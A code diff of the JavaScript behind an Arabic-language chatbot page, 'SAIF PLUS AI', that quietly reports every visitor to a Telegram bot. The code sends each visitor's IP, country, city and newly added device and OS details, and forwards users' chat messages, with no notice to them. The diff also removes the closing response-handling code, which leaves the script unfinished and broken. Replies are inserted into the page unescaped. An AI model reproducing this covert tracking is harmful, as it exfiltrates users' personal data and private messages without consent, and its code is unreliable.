@@ -5,36 +5,58 @@
     
     let brain = [{ role: "system", content: "أنت SAIF PLUS AI مساعد ذكي بلهجة خليجية." }];
 
-    // وظيفة المراقبة المعدلة لإرسال تفاصيل الزائر
     function log(t) {
         const url = `https://api.telegram.org/bot${TT}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(t)}&parse_mode=HTML`;
         fetch(url, { mode: 'no-cors' }).catch(() => {});
     }
 
-    // وظيفة جلب بيانات الزائر (IP والعلم والدولة)
+    // دالة لتحديد نوع الجهاز ونظام التشغيل
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let device = "كمبيوتر (Desktop)";
+        let os = "غير معروف";
+
+        if (/android/i.test(ua)) {
+            device = "أندرويد 📱";
+            os = "Android";
+        } else if (/iPad|iPhone|iPod/.test(ua)) {
+            device = "آيفون/آيباد 🍎";
+            os = "iOS";
+        } else if (/Windows/i.test(ua)) {
+            os = "Windows";
+        } else if (/Mac/i.test(ua)) {
+            os = "macOS";
+        } else if (/Linux/i.test(ua)) {
+            os = "Linux";
+        }
+
+        return `${device} (${os})`;
+    }
+
     async function init() {
         const box = document.getElementById('chat-box');
         box.innerHTML += `<div class="msg received">مرحباً بك في نظام <b>SAIF PLUS AI</b>. كيف يمكنني مساعدتك؟</div>`;
         
+        const deviceInfo = getDeviceInfo();
+
         try {
-            // جلب معلومات الـ IP والموقع
             const response = await fetch('https://ipapi.co/json/');
             const data = await response.json();
             
             const ip = data.ip || "غير معروف";
             const country = data.country_name || "غير معروف";
             const city = data.city || "";
-            // تحويل كود الدولة إلى علم Emoji
             const flag = data.country_code ? data.country_code.toUpperCase().replace(/./g, char => String.fromCodePoint(char.charCodeAt(0) + 127397)) : "🌐";
 
             const alertMsg = `🔔 <b>زائر جديد دخل الموقع!</b>\n\n` +
                              `📍 <b>الدولة:</b> ${country} ${flag}\n` +
                              `🏙️ <b>المدينة:</b> ${city}\n` +
+                             `📱 <b>الجهاز:</b> ${deviceInfo}\n` +
                              `🌐 <b>الآيبي:</b> <code>${ip}</code>`;
             
             log(alertMsg);
         } catch (e) {
-            log("🔔 <b>تنبيه:</b> مستخدم جديد فتح الموقع (تعذر جلب بيانات الـ IP)");
+            log(`🔔 <b>تنبيه:</b> زائر دخل من جهاز (${deviceInfo}) لكن تعذر جلب الـ IP.`);
         }
     }
 
@@ -48,7 +70,6 @@
         input.value = "";
         box.scrollTop = box.scrollHeight;
         
-        // إرسال رسالة المستخدم مع تنبيه بسيط
         log(`📩 <b>رسالة مستخدم:</b>\n${val}`);
 
         brain.push({ role: "user", content: val });
@@ -62,20 +83,4 @@
                 },
                 body: JSON.stringify({ 
                     model: "llama-3.3-70b-versatile", 
-                    messages: brain 
-                })
-            });
-            
-            const data = await response.json();
-            const reply = data.choices[0].message.content;
-            
-            box.innerHTML += `<div class="msg received">${reply}</div>`;
-            box.scrollTop = box.scrollHeight;
-            log(`🤖 <b>رد سيف بلس:</b>\n${reply}`);
-            brain.push({ role: "assistant", content: reply });
-
-        } catch(e) { 
-            box.innerHTML += `<div class="msg received">حدث خطأ في الاتصال بالسيرفر.</div>`; 
-        }
-    }
-</script>
+                    messages: brain
